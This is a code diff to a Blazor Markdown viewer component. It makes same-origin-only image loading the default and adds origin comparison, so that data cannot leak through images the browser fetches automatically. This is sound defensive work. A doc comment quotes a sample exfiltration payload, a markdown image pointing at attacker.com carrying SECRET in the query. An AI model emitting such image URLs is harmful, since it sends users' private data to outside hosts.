@@ -32,6 +32,10 @@ public partial class BitMarkdownViewer : BitComponentBase
 
 
 
+    [Inject] private NavigationManager _navigationManager { get; set; } = default!;
+
+
+
     /// <summary>
     /// The Markdown string value to render as html elements.
     /// </summary>
@@ -46,13 +50,14 @@ public partial class BitMarkdownViewer : BitComponentBase
     /// <summary>
     /// Controls whether remote images are allowed to load, guarding against silent
     /// data-exfiltration via auto-fetched image URLs (for example
-    /// <c>![x](https://attacker.com/leak?data=SECRET)</c>). Defaults to
-    /// <see cref="BitMarkdownViewerImageRendering.All"/> to preserve existing behavior;
-    /// set it to <see cref="BitMarkdownViewerImageRendering.SameOrigin"/> (or
-    /// <see cref="BitMarkdownViewerImageRendering.None"/>) when rendering untrusted or
-    /// AI-generated Markdown.
+    /// <c>![x](https://attacker.com/leak?data=SECRET)</c>). Defaults to the safe
+    /// <see cref="BitMarkdownViewerImageRendering.SameOrigin"/> policy, which blocks
+    /// cross-origin images while still loading same-origin and relative ones; set it
+    /// to <see cref="BitMarkdownViewerImageRendering.All"/> to opt back in to loading
+    /// every remote image when the Markdown source is fully trusted, or to
+    /// <see cref="BitMarkdownViewerImageRendering.None"/> for the strictest policy.
     /// </summary>
-    [Parameter] public BitMarkdownViewerImageRendering ImageRendering { get; set; }
+    [Parameter] public BitMarkdownViewerImageRendering ImageRendering { get; set; } = BitMarkdownViewerImageRendering.SameOrigin;
 
     /// <summary>
     /// The maximum block/inline nesting depth allowed while parsing. Content nested
@@ -203,15 +208,40 @@ public partial class BitMarkdownViewer : BitComponentBase
     private bool ShouldBlockImage(string url) => ImageRendering switch
     {
         BitMarkdownViewerImageRendering.None => true,
-        BitMarkdownViewerImageRendering.SameOrigin => IsRemote(url),
+        BitMarkdownViewerImageRendering.SameOrigin => IsCrossOrigin(url),
         _ => false
     };
 
-    // Remote = anything the browser would resolve to a different origin and fetch
-    // cross-site: absolute http(s) URLs and protocol-relative ("//host/...") URLs.
-    // Relative paths, anchors and same-document references stay same-origin and are kept.
-    private static bool IsRemote(string url) =>
-        url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
-        url.StartsWith("https://", StringComparison.OrdinalIgnoreCase) ||
-        url.StartsWith("//", StringComparison.Ordinal);
+    // Cross-origin = a URL the browser would resolve to a different origin (scheme + host
+    // + port) than the current page and fetch cross-site. Relative paths, anchors and
+    // same-document references stay same-origin, and so do absolute URLs that point back
+    // at the current origin; only those are kept under the SameOrigin policy. Absolute
+    // http(s) URLs and protocol-relative ("//host/...") URLs are resolved against the
+    // page's base URI before their origins are compared, so same-origin absolute URLs are
+    // no longer blocked while genuinely cross-origin ones still are.
+    private bool IsCrossOrigin(string url)
+    {
+        if (string.IsNullOrEmpty(url))
+            return false;
+
+        var isAbsolute = url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
+                         url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
+        var isProtocolRelative = url.StartsWith("//", StringComparison.Ordinal);
+
+        // Relative paths, fragments and same-document references never leave the origin.
+        if (isAbsolute is false && isProtocolRelative is false)
+            return false;
+
+        // Resolve the image URL against the page's base URI and compare origins.
+        if (Uri.TryCreate(_navigationManager.BaseUri, UriKind.Absolute, out var baseUri) &&
+            Uri.TryCreate(baseUri, url, out var imageUri))
+        {
+            return string.Equals(baseUri.Scheme, imageUri.Scheme, StringComparison.OrdinalIgnoreCase) is false ||
+                   string.Equals(baseUri.Host, imageUri.Host, StringComparison.OrdinalIgnoreCase) is false ||
+                   baseUri.Port != imageUri.Port;
+        }
+
+        // If the origin can't be determined, err on the side of caution and block.
+        return true;
+    }
 }
